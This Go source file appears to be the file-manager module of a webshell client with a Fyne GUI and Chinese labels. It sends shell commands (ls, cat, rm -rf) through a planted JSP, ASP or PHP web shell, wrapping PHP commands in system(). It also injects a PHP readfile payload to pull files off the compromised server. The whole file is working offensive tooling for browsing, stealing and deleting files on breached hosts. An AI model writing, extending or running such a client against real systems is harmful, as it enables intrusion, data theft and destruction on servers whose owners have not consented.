package main

import (
	"fmt"
	"fyne.io/fyne/v2/dialog"
	"io"
	"io/ioutil"
	"net/http"
	neturl "net/url"
	"os"
	"sort"
	"strconv"
	"strings"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"github.com/flopp/go-findfont"
)

type FileItem struct {
	Name  string
	IsDir bool
	Perms string
	Size  string
	Date  string
}

var connType string

func init() {
	// 设置中文字体
	fontPaths := findfont.List()
	for _, path := range fontPaths {
		if strings.Contains(path, "msyh.ttf") || strings.Contains(path, "simhei.ttf") || strings.Contains(path, "simsun.ttc") || strings.Contains(path, "simkai.ttf") {
			os.Setenv("FYNE_FONT", path)
			break
		}
	}
}

func executeCommand(remoteURL, command string) (string, error) {
	encodedCommand := urlEncode(command)
	var fullURL string
	fmt.Println(connType)
	fmt.Println(1)
	if connType == "JSP" || connType == "ASP" {
		fullURL = remoteURL + encodedCommand
	} else if connType == "PHP" {
		fullURL = remoteURL + "system(\"" + encodedCommand + "\");"

	}
	fmt.Println(fullURL)
	resp, err := http.Get(fullURL)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func listFiles(remoteURL, path string) ([]FileItem, error) {
	command := fmt.Sprintf("ls -l %s", path)
	output, err := executeCommand(remoteURL, command)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(output, "\n")
	var files []FileItem
	for _, line := range lines {
		if line == "" {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 9 {
			continue
		}
		isDir := fields[0][0] == 'd'
		name := fields[8]
		perms := fields[0]
		size := fields[4] + " B"
		if !isDir {
			sizeValue, _ := strconv.ParseInt(fields[4], 10, 64)
			if sizeValue >= 1024 {
				size = fmt.Sprintf("%.2f KB", float64(sizeValue)/1024)
			}
		}
		date := fmt.Sprintf("%s %s %s", fields[5], fields[6], fields[7])
		files = append(files, FileItem{Name: name, IsDir: isDir, Perms: perms, Size: size, Date: date})
	}

	sort.Slice(files, func(i, j int) bool {
		if files[i].IsDir == files[j].IsDir {
			return files[i].Name < files[j].Name
		}
		return files[i].IsDir && !files[j].IsDir
	})

	return files, nil
}

func deleteFile(remoteURL, path string) error {
	command := fmt.Sprintf("rm -rf %s", path)
	_, err := executeCommand(remoteURL, command)
	return err
}

func showFileContent(remoteURL, filePath string) (string, error) {
	command := fmt.Sprintf("cat %s", filePath)
	return executeCommand(remoteURL, command)
}

func RunFileManager(myWindow fyne.Window, remoteURL string, connType string) {

	resp, err := http.Get(remoteURL)
	if err != nil {
		fmt.Println("Failed to make GET request:", err)
		return
	}
	defer resp.Body.Close()

	var currentPath = "/"
	var list *widget.List
	var files []FileItem

	fmt.Println("Connection Type:", connType)

	updateList := func() {
		var err error
		files, err = listFiles(remoteURL, currentPath)
		if err != nil {
			files = []FileItem{{Name: "Error: " + err.Error(), IsDir: false}}
		}
		list.Refresh()
	}

	list = widget.NewList(
		func() int {
			return len(files)
		},
		func() fyne.CanvasObject {
			return container.NewGridWithColumns(8,
				widget.NewIcon(theme.FileIcon()),
				widget.NewLabel("File"),
				widget.NewLabel("Date"),
				widget.NewLabel("Size"),
				widget.NewLabel("Perms"),
				container.NewHBox(
					widget.NewButtonWithIcon("", theme.FolderOpenIcon(), nil),
					widget.NewButtonWithIcon("", theme.DownloadIcon(), nil),
					widget.NewButtonWithIcon("", theme.DeleteIcon(), nil),
				),
			)
		},
		func(id widget.ListItemID, item fyne.CanvasObject) {
			file := files[id]
			grid := item.(*fyne.Container)
			icon := grid.Objects[0].(*widget.Icon)
			nameLabel := grid.Objects[1].(*widget.Label)
			dateLabel := grid.Objects[2].(*widget.Label)
			sizeLabel := grid.Objects[3].(*widget.Label)
			permsLabel := grid.Objects[4].(*widget.Label)
			buttonContainer := grid.Objects[5].(*fyne.Container)
			openBtn := buttonContainer.Objects[0].(*widget.Button)
			downloadBtn := buttonContainer.Objects[1].(*widget.Button)
			deleteBtn := buttonContainer.Objects[2].(*widget.Button)

			nameLabel.SetText(file.Name)
			dateLabel.SetText(file.Date)
			sizeLabel.SetText(file.Size)
			permsLabel.SetText(file.Perms)

			if file.IsDir {
				icon.SetResource(theme.FolderIcon())
				openBtn.SetIcon(theme.FolderOpenIcon())
				sizeLabel.SetText("")
				dateLabel.SetText("")
				deleteBtn.Hide()
				downloadBtn.Hide()
			} else {
				icon.SetResource(theme.FileIcon())
				openBtn.SetIcon(theme.DocumentIcon())
				deleteBtn.Show()
				downloadBtn.Show()
			}

			openBtn.OnTapped = func() {
				if file.IsDir {
					currentPath += file.Name + "/"
					updateList()
				} else {
					content, err := showFileContent(remoteURL, currentPath+file.Name)
					if err != nil {
						content = "Error: " + err.Error()
					}
					contentEntry := widget.NewMultiLineEntry()
					contentEntry.SetText(content)
					scrollContainer := container.NewScroll(contentEntry)
					scrollContainer.SetMinSize(fyne.NewSize(800, 600))
					mainPageButton := widget.NewButton("返回主页", func() {
						w.SetContent(firstPage())
					})

					backButton := widget.NewButtonWithIcon("", theme.NavigateBackIcon(), func() {
						if currentPath != "/" {
							currentPath = currentPath[:strings.LastIndex(currentPath[:len(currentPath)-1], "/")+1]
							updateList()
						}
					})

					buttonContainer := container.NewVBox(mainPageButton, backButton)

					returnBtn := widget.NewButton("返回", func() {
						myWindow.SetContent(container.NewBorder(buttonContainer, nil, nil, nil, list))
					})

					myWindow.SetContent(container.NewBorder(returnBtn, nil, nil, nil, scrollContainer))
				}
			}

			downloadBtn.OnTapped = func() {
				if !file.IsDir {
					if connType == "PHP" {
						rawURL := remoteURL
						params := fmt.Sprintf("header('Content-Disposition: attachment; filename=\"%s\"'); readfile('%s');", file.Name, currentPath+file.Name)
						encodedParams := neturl.QueryEscape(params)
						downloadURL := fmt.Sprintf("%s%s", rawURL, encodedParams)
						fmt.Println(downloadURL)
						dialog.ShowFileSave(func(writer fyne.URIWriteCloser, _ error) {
							if writer == nil {
								return // 用户取消了操作
							}

							// 下载文件到指定位置
							resp, err := http.Get(downloadURL)
							if err != nil {
								dialog.ShowError(err, w)
								return
							}
							defer resp.Body.Close()

							dstFile, err := os.Create(writer.URI().Path())
							if err != nil {
								dialog.ShowError(err, w)
								return
							}
							defer dstFile.Close()

							_, err = io.Copy(dstFile, resp.Body)
							if err != nil {
								dialog.ShowError(err, w)
								return
							}

							dialog.ShowInformation("下载完成", fmt.Sprintf("文件已保存到: %s", writer.URI().Path()), w)
						}, w)
					} else if connType == "JSP" {
						dialog.ShowInformation("暂不支持", "当前连接类型暂时不支持下载功能", myWindow)
					} else {
						dialog.ShowInformation("暂不支持", "当前连接类型暂时不支持下载功能", myWindow)
					}

				}
			}

			openBtn.OnTapped = func() {
				if file.IsDir {
					currentPath += file.Name + "/"
					updateList()
				} else {
					content, err := showFileContent(remoteURL, currentPath+file.Name)
					if err != nil {
						content = "Error: " + err.Error()
					}
					contentEntry := widget.NewMultiLineEntry()
					contentEntry.SetText(content)
					scrollContainer := container.NewScroll(contentEntry)
					scrollContainer.SetMinSize(fyne.NewSize(800, 600))
					mainPageButton := widget.NewButton("返回主页", func() {
						w.SetContent(firstPage())
					})

					backButton := widget.NewButtonWithIcon("", theme.NavigateBackIcon(), func() {
						if currentPath != "/" {
							currentPath = currentPath[:strings.LastIndex(currentPath[:len(currentPath)-1], "/")+1]
							updateList()
						}
					})

					buttonContainer := container.NewVBox(mainPageButton, backButton)

					returnBtn := widget.NewButton("返回", func() {
						myWindow.SetContent(container.NewBorder(buttonContainer, nil, nil, nil, list))
					})

					myWindow.SetContent(container.NewBorder(returnBtn, nil, nil, nil, scrollContainer))
				}
			}

			deleteBtn.OnTapped = func() {
				deleteFile(remoteURL, currentPath+file.Name)
				updateList()
			}
		},
	)

	backButton := widget.NewButtonWithIcon("", theme.NavigateBackIcon(), func() {
		if currentPath != "/" {
			currentPath = currentPath[:strings.LastIndex(currentPath[:len(currentPath)-1], "/")+1]
			updateList()
		}
	})

	mainPageButton := widget.NewButton("返回主页", func() {
		w.SetContent(firstPage())
	})

	header := container.NewGridWithColumns(7,
		widget.NewLabelWithStyle("", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabelWithStyle("文件名", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabelWithStyle("文件日期", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabelWithStyle("文件大小", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabelWithStyle("文件权限", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabel(""),
		widget.NewLabel(""),
	)

	initialContent := container.NewBorder(container.NewVBox(mainPageButton, backButton, header), nil, nil, nil, list)

	myWindow.SetContent(initialContent)
	updateList()
}
